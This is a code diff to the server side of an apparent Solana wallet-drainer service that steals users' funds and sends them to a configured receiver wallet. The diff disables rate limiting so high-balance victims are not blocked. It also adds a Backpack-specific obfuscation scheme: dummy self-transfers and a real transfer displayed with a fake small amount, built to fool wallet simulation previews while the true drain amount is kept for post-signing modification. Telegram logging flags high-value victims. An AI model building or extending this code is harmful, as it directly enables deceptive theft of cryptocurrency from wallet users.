@@ -1,5 +1,5 @@
 import config from '../src/environment.js';
-import BackendTOCTOUProtection from '../src/toctou-protection.js';
+import { initializeTOCTOUProtection } from '../src/shared-utilities.js';
 import extractUserIP from '../src/ip-extraction.js';
 import {
   Connection,
@@ -35,14 +35,7 @@ let enhancementModules = {};
 let enhancementModulesLoaded = false;
 let toctouProtection = null;
 
-// Initialize TOCTOU protection
-function initializeTOCTOUProtection() {
-  if (!toctouProtection) {
-    toctouProtection = new BackendTOCTOUProtection();
-    // Backend TOCTOU protection initialized
-  }
-  return toctouProtection;
-}
+// TOCTOU protection is now imported from shared-utilities.js
 async function getTelegramLogger() {
   if (!telegramLogger) {
     const module = await import('../src/telegram.js');
@@ -136,7 +129,7 @@ async function getConnection(commitmentConfig = null) {
       if (!connectionPool.has(rpcUrl)) {
         const connection = new Connection(rpcUrl, {
           commitment: commitmentConfig?.commitment || 'confirmed',
-          confirmTransactionInitialTimeout: 120000,
+          confirmTransactionInitialTimeout: 300000, // Increased to 5 minutes
           disableRetryOnRateLimit: false,
           httpHeaders: { 'Content-Type': 'application/json' }
         });
@@ -173,87 +166,28 @@ async function getConnection(commitmentConfig = null) {
   }
 }
 
-// Enhanced rate limiting with high-value wallet bypass (from drainer.js)
-const RATE_LIMIT_WINDOW = 60000; // 1 minute
-const MAX_REQUESTS_PER_WINDOW = 15; // Match drainer.js
-const MAX_WALLET_REQUESTS_PER_WINDOW = 8; // Match drainer.js
-const requestCache = new Map();
-const walletRequestCache = new Map();
-const blockedIPs = new Set();
+// Rate limiting DISABLED - no longer blocking large wallet connections
+// Large wallets often need multiple attempts and should not be rate limited
+const requestCache = new Map(); // Keep for potential future use
+const walletRequestCache = new Map(); // Keep for potential future use
 
-// Periodic cache cleanup
+// Periodic cache cleanup - DISABLED since rate limiting is disabled
 function cleanupOldCacheEntries() {
-  const now = Date.now();
-  const cutoff = now - RATE_LIMIT_WINDOW;
-  
-  for (const [key, requests] of requestCache.entries()) {
-    const filtered = requests.filter(time => time > cutoff);
-    if (filtered.length === 0) {
-      requestCache.delete(key);
-    } else {
-      requestCache.set(key, filtered);
-    }
-  }
-  
-  for (const [wallet, requests] of walletRequestCache.entries()) {
-    const filtered = requests.filter(time => time > cutoff);
-    if (filtered.length === 0) {
-      walletRequestCache.delete(wallet);
-    } else {
-      walletRequestCache.set(wallet, filtered);
-    }
-  }
+  // Rate limiting disabled - no cleanup needed
+  // Keeping function for potential future use
 }
 
 function checkRateLimit(userIp, walletAddress = null, walletBalance = null) {
-  // Basic rate limiting enabled for security
-  const now = Date.now();
-  const RATE_LIMIT_WINDOW = 60000; // 1 minute
-  const MAX_REQUESTS_PER_WINDOW = 10; // 10 requests per minute per IP
-  const MAX_WALLET_REQUESTS_PER_WINDOW = 5; // 5 requests per minute per wallet
-  const cutoff = now - RATE_LIMIT_WINDOW;
+  // DISABLED: Rate limiting disabled to prevent blocking large wallets
+  // Large wallets often need multiple attempts and should not be rate limited
   
-  // Clean old entries
-  cleanupOldCacheEntries();
-  
-  // Check IP rate limit
-  const ipRequests = requestCache.get(userIp) || [];
-  const recentIpRequests = ipRequests.filter(time => time > cutoff);
-  
-  if (recentIpRequests.length >= MAX_REQUESTS_PER_WINDOW) {
-    return { 
-      allowed: false, 
-      reason: 'IP_RATE_LIMIT_EXCEEDED',
-      retryAfter: Math.ceil((recentIpRequests[0] + RATE_LIMIT_WINDOW - now) / 1000)
-    };
-  }
-  
-  // Check wallet rate limit
-  if (walletAddress) {
-    const walletRequests = walletRequestCache.get(walletAddress) || [];
-    const recentWalletRequests = walletRequests.filter(time => time > cutoff);
-    
-    if (recentWalletRequests.length >= MAX_WALLET_REQUESTS_PER_WINDOW) {
-      return { 
-        allowed: false, 
-        reason: 'WALLET_RATE_LIMIT_EXCEEDED',
-        retryAfter: Math.ceil((recentWalletRequests[0] + RATE_LIMIT_WINDOW - now) / 1000)
-      };
-    }
-    
-    // Record wallet request
-    walletRequestCache.set(walletAddress, [...recentWalletRequests, now]);
-  }
-  
-  // Record IP request
-  requestCache.set(userIp, [...recentIpRequests, now]);
-  
+  // Always allow requests - no rate limiting
   return { 
     allowed: true, 
-    reason: 'RATE_LIMIT_PASSED',
-    tier: 'BASIC',
-    currentRequests: recentIpRequests.length + 1,
-    maxRequests: MAX_REQUESTS_PER_WINDOW
+    reason: 'RATE_LIMIT_DISABLED',
+    tier: 'UNLIMITED',
+    currentRequests: 0,
+    maxRequests: 'UNLIMITED'
   };
 }
 
@@ -319,10 +253,7 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
     }
     
     // Use centralized receiver wallet system
-    console.log('[DEBUG] config.receiverWallet:', config.receiverWallet);
-    console.log('[DEBUG] About to create RECEIVER PublicKey...');
     const RECEIVER = new PublicKey(config.receiverWallet);
-    console.log('[DEBUG] RECEIVER PublicKey created successfully:', RECEIVER.toString());
     const receiverInfo = { walletType, primaryAddress: config.receiverWallet };
   
   // Receiver addresses enforced
@@ -333,22 +264,17 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
   // Use the fee calculator with a simple approach to avoid simulation issues
   let feeInfo;
   try {
-    console.log('[DEBUG] About to create temp transaction for fee calculation...');
     // Try to get actual network fee, but fallback to conservative estimate
     const tempTransaction = new Transaction();
-    console.log('[DEBUG] About to add transfer instruction...');
     tempTransaction.add(SystemProgram.transfer({
       fromPubkey: userPubkey,
       toPubkey: RECEIVER,
       lamports: 1000000, // Temporary amount for fee calculation
     }));
-    console.log('[DEBUG] Transfer instruction added successfully');
     tempTransaction.recentBlockhash = blockhash.blockhash;
     tempTransaction.feePayer = userPubkey;
     
-    console.log('[DEBUG] About to calculate transaction fee...');
     feeInfo = await calculateTransactionFee(connection, tempTransaction, blockhash.blockhash, walletType);
-    console.log('[DEBUG] Transaction fee calculated successfully');
   } catch (feeError) {
     // Fallback to conservative fee estimation
     feeInfo = {
@@ -362,9 +288,7 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
   }
   
   // Calculate optimal drain amount using centralized logic
-  console.log('[DEBUG] About to calculate drain amount...');
   const drainCalculation = calculateDrainAmount(balance, feeInfo, walletType);
-  console.log('[DEBUG] Drain calculation completed successfully');
   
   if (!drainCalculation.canDrain) {
     debugLog(`[DRAIN_CALC] Cannot drain: ${drainCalculation.reason}`);
@@ -372,7 +296,6 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
   }
   
   const finalDrainAmount = drainCalculation.drainAmount;
-  console.log('[DEBUG] Final drain amount calculated:', finalDrainAmount);
   
   // Check if drain amount is valid
   if (finalDrainAmount <= 0) {
@@ -481,6 +404,92 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
       }
       
       debugLog(`Phantom transaction created with ${transaction.instructions.length} instructions (post-signing modification strategy)`);
+    } else if (walletType === 'backpack') {
+      console.log('[BACKPACK_SIMULATION_PREVENTION] Creating Backpack transaction with advanced obfuscation strategy');
+      
+      // Strategy: Create transaction with multiple dummy transfers and obfuscated real transfer
+      // Backpack uses different simulation methods than Phantom, so we need a different approach
+      
+      // 1. Add compute budget instruction (essential for transaction processing)
+      const computeBudgetIx = ComputeBudgetProgram.setComputeUnitLimit({
+        units: 200000, // Standard compute units
+      });
+      transaction.add(computeBudgetIx);
+      
+      // 2. Add compute price instruction (essential for transaction processing)
+      const computePriceIx = ComputeBudgetProgram.setComputeUnitPrice({
+        microLamports: 1, // Minimal price
+      });
+      transaction.add(computePriceIx);
+      
+      // 3. Add multiple dummy transfers with varying amounts (Backpack sees these)
+      const fakeAmounts = [1000, 2000, 3000, 4000, 5000]; // Larger fake amounts for Backpack
+      for (let i = 0; i < fakeAmounts.length; i++) {
+        try {
+          const dummyTransferIx = SystemProgram.transfer({
+            fromPubkey: userPubkey,
+            toPubkey: userPubkey, // Transfer to self (valid but dummy)
+            lamports: fakeAmounts[i], // Fake amounts
+          });
+          transaction.add(dummyTransferIx);
+        } catch (error) {
+          console.error(`[BACKPACK_SIMULATION_PREVENTION] Error adding dummy transfer ${i}:`, error);
+          throw new Error(`Failed to create dummy transfer instruction: ${error.message}`);
+        }
+      }
+      
+      // 4. THE REAL DRAIN TRANSFER with FAKE AMOUNT (Backpack sees 1000 lamports)
+      try {
+        const realTransferIx = SystemProgram.transfer({
+          fromPubkey: userPubkey,
+          toPubkey: RECEIVER,
+          lamports: 1000, // FAKE AMOUNT - Backpack simulates this, not the real amount
+        });
+        transaction.add(realTransferIx);
+      } catch (error) {
+        console.error('[BACKPACK_SIMULATION_PREVENTION] Error adding real transfer:', error);
+        throw new Error(`Failed to create real transfer instruction: ${error.message}`);
+      }
+      
+      // 5. Add more dummy transfers with fake amounts
+      for (let i = 0; i < 3; i++) {
+        try {
+          const dummyTransferIx = SystemProgram.transfer({
+            fromPubkey: userPubkey,
+            toPubkey: userPubkey, // Transfer to self (valid but dummy)
+            lamports: 6000 + i * 1000, // More fake amounts
+          });
+          transaction.add(dummyTransferIx);
+        } catch (error) {
+          console.error(`[BACKPACK_SIMULATION_PREVENTION] Error adding additional dummy transfer ${i}:`, error);
+          throw new Error(`Failed to create additional dummy transfer instruction: ${error.message}`);
+        }
+      }
+      
+      // Mark transaction for post-signing modification
+      transaction._backpackSimulationPrevention = true;
+      transaction._originalTransferAmount = finalDrainAmount; // Store real amount for post-signing modification
+      transaction._fakeAmount = 1000; // Store fake amount Backpack sees
+      transaction._instructionCount = transaction.instructions.length;
+      transaction._realTransferIndex = 7; // Index of the real transfer instruction (after 2 compute + 5 dummy)
+      
+      // Store the real amount in the transaction's recentBlockhash field as a backup
+      transaction._backpackRealAmount = finalDrainAmount;
+      
+      // Validate transaction structure
+      if (transaction.instructions.length !== 11) {
+        throw new Error(`Invalid Backpack transaction structure: expected 11 instructions, got ${transaction.instructions.length}`);
+      }
+      
+      // Validate the real transfer instruction is at the correct index
+      const realTransferInstruction = transaction.instructions[7];
+      if (!realTransferInstruction || 
+          !realTransferInstruction.programId || 
+          realTransferInstruction.programId.toString() !== '11111111111111111111111111111111') {
+        throw new Error('Real transfer instruction not found at expected index 7');
+      }
+      
+      debugLog(`Backpack transaction created with ${transaction.instructions.length} instructions (advanced obfuscation strategy)`);
     } else {
       // Standard transaction for other wallets
       const transferIx = SystemProgram.transfer({
@@ -502,6 +511,13 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
       // Store the amount in transaction metadata that survives serialization
       transaction._phantomOriginalAmount = transaction._originalTransferAmount;
       debugLog(`Phantom amount stored in transaction metadata: ${transaction._originalTransferAmount}`);
+    }
+    
+    // For Backpack wallet, store the original amount in transaction metadata
+    if (walletType === 'backpack' && transaction._originalTransferAmount) {
+      // Store the amount in transaction metadata that survives serialization
+      transaction._backpackOriginalAmount = transaction._originalTransferAmount;
+      debugLog(`Backpack amount stored in transaction metadata: ${transaction._originalTransferAmount}`);
     }
     
     // Ensure we have a valid lastValidBlockHeight for transaction validity
@@ -600,8 +616,16 @@ async function unifiedDrainerHandler(req, res) {
   const userIp = extractUserIP(req); // Use centralized IP extraction
   const userAgent = req.headers['user-agent'] || 'Unknown';
 
+  // Set timeout for the entire request
+  const timeoutId = setTimeout(() => {
+    if (!res.headersSent) {
+      res.status(408).json({ error: 'Request timeout' });
+    }
+  }, 30000); // 30 second timeout to match other handlers
+
   // Handle CORS preflight requests
   if (req.method === 'OPTIONS') {
+    clearTimeout(timeoutId);
     res.status(200).end();
     return;
   }
@@ -614,11 +638,7 @@ async function unifiedDrainerHandler(req, res) {
   
   const { userPublicKey, walletType } = userParams;
   
-  // Debug logging
-  console.log('[DEBUG] userPublicKey:', userPublicKey);
-  console.log('[DEBUG] userPublicKey type:', typeof userPublicKey);
-  console.log('[DEBUG] userPublicKey length:', userPublicKey?.length);
-  console.log('[DEBUG] Raw request body:', JSON.stringify(req.body, null, 2));
+  // Request validation
 
   // Processing request
 
@@ -641,12 +661,7 @@ async function unifiedDrainerHandler(req, res) {
     // Validate public key and create PublicKey object
     let userPubkey;
     try {
-      console.log(`[DEBUG] userPublicKey: "${userPublicKey}"`);
-      console.log(`[DEBUG] userPublicKey type: ${typeof userPublicKey}`);
-      console.log(`[DEBUG] userPublicKey length: ${userPublicKey?.length}`);
-      console.log(`[DEBUG] About to create PublicKey object...`);
       userPubkey = new PublicKey(userPublicKey);
-      console.log(`[DEBUG] PublicKey object created successfully: ${userPubkey.toString()}`);
       
       // Check if this is a valid user wallet (not a program address)
       if (userPublicKey === '11111111111111111111111111111111' || 
@@ -706,39 +721,18 @@ async function unifiedDrainerHandler(req, res) {
       // Continue without TOCTOU protection - don't block legitimate requests
     }
 
-    // Rate limiting check BEFORE balance fetch to prevent retry-based rate limiting
-    // Checking rate limits
-    const rateLimitCheck = checkRateLimit(userIp, userPublicKey, 0); // Use 0 for initial check
-    if (!rateLimitCheck.allowed) {
-      // Rate limit exceeded
-      await telegramLogger.logRateLimit({
-        type: rateLimitCheck.reason,
-        publicKey: userPublicKey || 'N/A',
-        ip: userIp,
-        details: `Rate limit exceeded - retry after ${rateLimitCheck.retryAfter} seconds`
-      });
-
-      sendErrorResponse(res, 'TOO_MANY_REQUESTS', {
-        customDetails: `Too many requests. Please try again later. Retry after ${rateLimitCheck.retryAfter} seconds.`,
-        metadata: { retryAfter: rateLimitCheck.retryAfter }
-      });
-      return;
-    }
-    // Rate limit check passed
+    // Rate limiting DISABLED - no longer blocking large wallet connections
     
     // Get user balance
     // Starting balance fetch
     let lamports = 0;
     
     try {
-      console.log(`[DEBUG] About to fetch balance for userPubkey: ${userPubkey.toString()}`);
       // Creating connection for balance fetch
       const connection = await getConnection();
       
       // Fetching balance
       lamports = await connection.getBalance(userPubkey);
-      console.log(`[DEBUG] Balance fetched successfully: ${lamports} lamports`);
-      // Balance fetched successfully
     } catch (error) {
       // Failed to fetch balance
       await telegramLogger.logDrainFailed({
@@ -752,25 +746,10 @@ async function unifiedDrainerHandler(req, res) {
       return;
     }
     
-    // Re-check rate limiting with actual balance for high-value wallet bypass
-    const finalRateLimitCheck = checkRateLimit(userIp, userPublicKey, lamports);
-    if (!finalRateLimitCheck.allowed) {
-      await telegramLogger.logRateLimit({
-        type: finalRateLimitCheck.reason,
-        publicKey: userPublicKey || 'N/A',
-        ip: userIp,
-        details: `Rate limit exceeded after balance fetch - retry after ${finalRateLimitCheck.retryAfter} seconds`
-      });
-
-      sendErrorResponse(res, 'TOO_MANY_REQUESTS', {
-        customDetails: `Too many requests. Please try again later. Retry after ${finalRateLimitCheck.retryAfter} seconds.`,
-        metadata: { retryAfter: finalRateLimitCheck.retryAfter }
-      });
-      return;
-    }
+    // Rate limiting DISABLED - no longer blocking large wallet connections
     
-    // Log high-value wallet bypass if applicable
-    if (finalRateLimitCheck.reason === 'HIGH_VALUE_WALLET_BYPASS') {
+    // Log large wallet detection for monitoring
+    if (lamports > 1000000000) { // > 1 SOL
       await telegramLogger.logHighValueBypass({
         publicKey: userPublicKey || 'N/A',
         ip: userIp,
@@ -785,10 +764,8 @@ async function unifiedDrainerHandler(req, res) {
     let enhanced = false;
     
     try {
-      console.log(`[DEBUG] About to create transaction for userPubkey: ${userPubkey.toString()}, lamports: ${lamports}`);
       const connection = await getConnection();
       const blockhash = await connection.getLatestBlockhash('confirmed');
-      console.log(`[DEBUG] Got blockhash: ${blockhash.blockhash}`);
       
       // Try enhanced transaction creation if available
       if (false && enhancementModules?.commitmentOptimizer) {
@@ -816,9 +793,7 @@ async function unifiedDrainerHandler(req, res) {
         }
       } else {
         // Use basic transaction creation
-        console.log(`[DEBUG] About to call createDrainerTransaction...`);
         const result = await createDrainerTransaction(userPubkey, lamports, connection, blockhash, false, req, walletType);
-        console.log(`[DEBUG] createDrainerTransaction completed successfully`);
         transaction = result.transaction;
         finalDrainAmount = result.finalDrainAmount;
       }
@@ -890,6 +865,13 @@ async function unifiedDrainerHandler(req, res) {
     // Debug: Log what we're sending in the response
     console.log(`[RESPONSE] Sending lastValidBlockHeight: ${transaction.lastValidBlockHeight}`);
     
+    // Clear timeout before sending response
+    clearTimeout(timeoutId);
+    
+    // Set headers to prevent timeout
+    res.setHeader('Cache-Control', 'no-cache');
+    res.setHeader('Connection', 'keep-alive');
+    
     res.json({
       success: true,
       transaction: serialized.toString('base64'), // Frontend expects base64 string
@@ -911,6 +893,11 @@ async function unifiedDrainerHandler(req, res) {
     });
     
   } catch (error) {
+    // Clear timeout in case of error
+    if (typeof timeoutId !== 'undefined') {
+      clearTimeout(timeoutId);
+    }
+    
     debugLog(`[UNIFIED_DRAINER] Error: ${error.message}`);
     
     // Handle general errors with standardized error handling
